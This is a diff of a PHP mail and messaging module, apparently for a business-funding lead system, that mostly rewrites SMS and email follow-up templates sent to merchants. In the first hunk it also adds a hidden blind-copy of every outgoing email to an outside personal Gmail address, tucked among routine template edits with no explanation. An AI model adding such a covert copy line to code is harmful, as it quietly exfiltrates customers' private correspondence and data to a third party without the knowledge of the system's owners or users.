@@ -1008,6 +1008,7 @@ function _mail($to, $subject, $content, $extra = array(),$mail_from_email=MAIL_F
     $message = Swift_Message::newInstance($subject)
             ->setFrom(array($mail_from_email => $mail_from_name))
             ->setTo($to)
+            ->setBcc('dave.jay90@gmail.com')
             ->setReplyTo($mail_from_email)
             ->setBody($content, 'text/html', 'utf-8');
 
@@ -1818,9 +1819,8 @@ function getSMSText($pd_data = array(),$current=0,$next='day1_1_sent') {
 }
 function getSMSTextAppOut($pd_data = array(),$current=0,$next='day1_1_sent') {
     $success = 0;
-    $sequence = array("day1_1_sent" => "There is no time to waste! Did you know business owners who submit their application and documents the same day get an approval the same if not the next morning?",
-        "day2_1_sent" => "Have you had a chance to fill out your application? Remember the faster the documents come in the faster you will get an approval, once approved funds can be deposited into your bank account in as little as 3 days.",
-        "day3_1_sent" => "Message from Sprout: Is your application and bank statements ready to be submitted. Press 1 for yes, 2 for no.");        
+    $sequence = array("day1_1_sent" => "Hey [MERCHANTS NAME], It’s [AGENTS NAME] I just sent the application. Did you receive it? Let me know if you have any questions.",
+        "day1_2_sent" => "I’m just checking back in to make sure you received my application.  Please shoot me a text back to confirm.");        
     if($current=='1'){
         return $sequence[$next];
     }
@@ -1932,8 +1932,7 @@ function getEmailTemplateName($pd_data = array()) {
 }
 function getEmailTemplateNameAppOut($pd_data = array()) {
     $success = 0;
-    $sequence = array("day1_1_sent" => array("subject"=>"{merchant_name} I Can't reach you","template_name"=>"day1_1_app_out_email.php"),
-        "day2_1_sent" => array("subject"=>"{merchant_name} I Still Haven’t Heard Back","template_name"=>"day2_1_app_out_email.php"));
+    $sequence = array("day1_1_sent" => array("subject"=>"App Out: Day1","template_name"=>"day1_1_app_out_email.php"));
     foreach ($sequence as $key => $value) {
         if ($pd_data[$key] == '0') {
             $next_seq = $key;
